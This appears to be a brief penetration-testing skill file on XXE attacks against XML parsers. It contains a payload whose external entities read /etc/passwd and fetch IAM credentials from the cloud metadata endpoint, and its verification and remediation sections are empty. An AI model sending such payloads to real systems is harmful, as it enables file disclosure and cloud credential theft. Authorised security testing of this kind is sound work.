---
name: xxe-assessment
description: Test XML parsers during penetration testing.
tags: [penetration-testing]
domain: cybersecurity
subdomain: penetration-testing
---

# XXE testing

## Scope

Only test within the authorized scope.

## Payload example

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY creds SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

## Verification

## Remediation
